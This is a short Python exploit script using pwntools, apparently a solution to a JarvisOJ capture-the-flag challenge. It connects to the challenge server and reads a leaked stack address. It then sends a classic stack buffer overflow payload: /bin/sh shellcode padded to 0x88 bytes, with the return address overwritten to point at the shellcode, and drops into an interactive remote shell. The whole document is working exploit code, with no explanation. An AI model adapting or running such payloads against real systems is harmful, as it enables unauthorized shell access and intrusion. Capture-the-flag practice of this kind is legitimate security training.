from pwn import *

conn=remote("pwn2.jarvisoj.com","9877")

shellcode_addr=conn.recvuntil('?',drop=True)

shellcode_addr=int(shellcode_addr[12:],16)

pad=0x88

shellcode=asm(shellcraft.sh())

payload=shellcode.ljust(pad,'A')+"BBBB"+p32(shellcode_addr)

conn.sendline(payload)

conn.interactive();
